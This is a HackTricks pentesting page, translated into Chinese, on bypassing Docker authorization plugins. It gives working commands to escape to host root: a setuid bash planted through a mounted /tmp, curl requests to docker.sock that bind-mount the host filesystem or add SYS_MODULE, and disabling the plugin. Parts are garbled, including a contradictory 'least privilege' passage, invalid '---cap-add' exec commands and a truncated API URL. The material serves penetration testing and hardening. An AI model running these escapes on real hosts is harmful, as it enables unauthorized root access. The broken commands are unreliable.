<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


**Docker**的**授权**模型是**全有或全无**的。任何具有访问Docker守护程序权限的用户都可以运行任何Docker客户端命令。对于使用Docker的Engine API与守护程序联系的调用者也是如此。如果您需要更精细的访问控制，可以创建授权插件并将其添加到Docker守护程序配置中。使用授权插件，Docker管理员可以配置用于管理对Docker守护程序的访问的细粒度访问策略。

# 基本架构

Docker Auth插件是您可以使用的**外部插件**，用于根据请求它的**用户**和**请求的操作**来**允许/拒绝**对Docker守护程序的请求。

当通过CLI或通过Engine API向Docker守护程序发出**HTTP请求**时，**身份验证子系统**将请求传递给已安装的**身份验证插件**。请求包含用户（调用者）和命令上下文。插件负责决定是否允许或拒绝请求。

下面的序列图描述了允许和拒绝授权流程：

![授权允许流程](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![授权拒绝流程](https://docs.docker.com/engine/extend/images/authz\_deny.png)

发送到插件的每个请求都包括经过身份验证的用户、HTTP头和请求/响应正文。只有用户名和所使用的身份验证方法会传递给插件。最重要的是，不会传递任何用户凭据或令牌。最后，并非所有的请求/响应正文都会发送到授权插件。只有那些`Content-Type`为`text/*`或`application/json`的请求/响应正文会被发送。

对于可能劫持HTTP连接（`HTTP Upgrade`）的命令（如`exec`），授权插件仅对初始HTTP请求调用。一旦插件批准了命令，授权就不会应用于流程的其余部分。具体来说，流式数据不会传递给授权插件。对于返回分块HTTP响应的命令（如`logs`和`events`），只有HTTP请求会发送到授权插件。

在请求/响应处理过程中，某些授权流程可能需要对Docker守护程序进行额外的查询。为了完成这些流程，插件可以像普通用户一样调用守护程序API。为了启用这些额外的查询，插件必须提供一种管理员可以配置适当的身份验证和安全策略的方法。

## 多个插件

您负责将您的插件**注册**为Docker守护程序**启动**的一部分。您可以安装**多个插件并将它们链接在一起**。这个链可以被排序。每个请求按顺序通过链传递。只有当**所有插件都授予对资源的访问权限**时，访问权限才被授予。

# 插件示例

## Twistlock AuthZ Broker

插件[**authz**](https://github.com/twistlock/authz)允许您创建一个简单的**JSON**文件，插件将读取该文件以授权请求。因此，它为您提供了非常容易控制每个用户可以访问哪些API端点的机会。

以下是一个示例，允许Alice和Bob创建新的容器：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

在页面[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go)中，您可以找到请求的URL与操作之间的关系。在页面[types.go](https://github.com/twistlock/authz/blob/master/core/types.go)中，您可以找到操作名称与操作之间的关系。

## 简单插件教程

您可以在这里找到一个**易于理解的插件**，其中包含有关安装和调试的详细信息：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

阅读`README`和`plugin.go`代码以了解其工作原理。

# Docker Auth插件绕过

## 枚举访问权限

要检查的主要内容是**允许的端点**和**允许的HostConfig值**。

要执行此枚举，您可以使用工具[**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**。**
## 禁止 `run --privileged`

### 最低权限

在Docker中，`run --privileged`命令允许容器以特权模式运行，这意味着容器内的进程将具有与主机系统相同的权限。然而，这种特权模式可能会导致安全风险，因此建议禁止使用`run --privileged`命令。

相反，应该使用最低权限来运行容器。这意味着只授予容器所需的最小权限，以限制容器对主机系统的访问。这可以通过使用`run --cap-drop`和`run --cap-add`选项来实现。

`run --cap-drop`选项用于删除容器的特权，而`run --cap-add`选项用于添加容器所需的特权。通过仔细选择要添加和删除的特权，可以确保容器只能访问必要的资源，从而减少潜在的安全风险。

以下是一个示例，演示如何使用最低权限运行容器：

```bash
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE my-container
```

在上述示例中，`--cap-drop=ALL`选项删除了容器的所有特权，而`--cap-add=NET_BIND_SERVICE`选项添加了容器所需的特权。

通过使用最低权限来运行容器，可以提高系统的安全性，并减少潜在的攻击风险。
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### 运行容器并获取特权会话

在这种情况下，系统管理员**禁止用户挂载卷和使用`--privileged`标志运行容器**，也不允许给容器赋予额外的权限：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
然而，用户可以在正在运行的容器内创建一个shell，并赋予它额外的权限：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
现在，用户可以使用之前讨论过的任何技术[**（参见此处）**](./#privileged-flag)从容器中逃脱，并在主机内**提升权限**。

## 挂载可写文件夹

在这种情况下，系统管理员**禁止用户使用`--privileged`标志运行容器**或为容器提供任何额外的能力，只允许挂载`/tmp`文件夹：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
请注意，您可能无法挂载`/tmp`文件夹，但可以挂载**其他可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`

**请注意，并非Linux机器上的所有目录都支持suid位！**为了检查哪些目录支持suid位，请运行`mount | grep -v "nosuid"`。例如，通常`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`和`/var/lib/lxcfs`不支持suid位。

还要注意，如果您可以**挂载`/etc`**或任何其他**包含配置文件**的文件夹，您可以作为root用户从docker容器中更改它们，以便在主机上**滥用它们**并提升权限（可能修改`/etc/shadow`）
{% endhint %}

## 未经检查的API端点

配置此插件的系统管理员的责任是控制每个用户可以执行的操作以及使用的权限。因此，如果管理员采用**黑名单**方法来处理端点和属性，可能会**遗漏一些**可能允许攻击者**提升权限**的端点。

您可以在[https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)上查看docker API。

## 未经检查的JSON结构

### 在根目录中绑定

当系统管理员配置docker防火墙时，可能会**忘记一些重要的**[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)参数，比如“**Binds**”。\
在下面的示例中，可以利用此配置错误创建和运行一个容器，该容器挂载了主机的根（/）文件夹：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
请注意，在此示例中，我们将**`Binds`**参数用作JSON的根级键，但在API中，它出现在**`HostConfig`**键下面。
{% endhint %}

### 在HostConfig中的Binds

按照与**在根目录中的Binds**相同的指示，执行以下**请求**到Docker API：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### 根目录中的挂载

按照与**根目录中的绑定**相同的指示，通过向Docker API发送此**请求**来执行操作：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig中的挂载

按照与**根目录中的绑定**相同的指示，通过向Docker API执行此**请求**来进行操作：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## 未检查的JSON属性

当系统管理员配置Docker防火墙时，有可能**忘记了某个参数的一些重要属性**，例如[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)中的 "**Capabilities**" 在 "**HostConfig**" 内部。在下面的示例中，可以利用这个配置错误来创建和运行一个具有 **SYS\_MODULE** 能力的容器：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** 是通常包含逃离容器的有趣特权的关键。然而，正如我们之前讨论的那样，注意在其外部使用绑定也可以起作用，并且可能允许您绕过限制。
{% endhint %}

## 禁用插件

如果**系统管理员**忘记**禁止**禁用**插件**的能力，您可以利用这一点来完全禁用它！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
记得在提升权限后**重新启用插件**，否则**重启docker服务将无效**！

## Auth插件绕过攻略

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# 参考资料

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
